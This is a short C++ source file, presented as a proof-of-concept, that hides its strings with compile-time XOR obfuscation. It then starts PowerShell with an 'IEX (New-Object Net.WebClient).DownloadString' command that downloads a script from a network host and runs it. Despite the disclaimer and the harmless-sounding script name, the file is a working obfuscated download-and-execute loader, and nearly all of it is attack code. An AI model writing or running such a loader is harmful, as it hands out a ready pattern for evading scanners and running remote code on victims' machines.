/**
 * Creator:    VPR
 * Created:    February 20th, 2021
 * Updated:    February 20th, 2021
 *
 * Disclaimer:
 *     This program was designed as a proof-of-concept. It doesn't do anything
 *     malicious and it is not intended to do so. Don't try to use it for any
 *     malicious or illegal activity.
**/

#include <windows.h>
#include <malloc.h>

#define OBF(string) []() -> char* {                                     \
    constexpr auto s = Obfuscated<sizeof(string)/sizeof(char)>(string); \
    return s.Data();                                                    \
}()

template <int size>
struct Obfuscated {
private:
    char data[size];
    unsigned char key[size];
public:
    constexpr Obfuscated<size>(const char* text)
        : data()
        , key()
    {
        for (int i = 0; i < size; i++) {
            key[i] = __TIME__[i % sizeof(__TIME__)];
        }
        for (int i = 0; i < size; i++) {
            data[i] = text[i] ^ key[i % sizeof(key)];
        }
    }
    char* Data() const {
        char* tmp = (char *)malloc(size * sizeof(char));
        for (int i = 0; i < size; i++) {
            tmp[i] = data[i] ^ key[i % sizeof(key)];
        }
        return tmp;
    }
};

int main() {

    STARTUPINFOA        si{0};
    PROCESS_INFORMATION pi{0};
    char*               tmp;

    // Invoke powershell
    CreateProcessA(
        NULL,                                // Path
        (tmp = (OBF("powershell.exe "        // Command line arguments
                    "-nop -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.101:8001/writehello.ps1')"))), 
        NULL,                                // Process handle not inheritable
        NULL,                                // Thread handle not inheritable
        FALSE,                               // Set handle inheritance to FALSE
        0,                                   // CREATE_NEW_CONSOLE, // No creation flags
        NULL,                                // Use parent's environment block
        NULL,                                // Current directory
        &si,                                 // Use parent's starting directory
        &pi                                  // STARTUPINFO pointer
    );
    free((void *)tmp);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
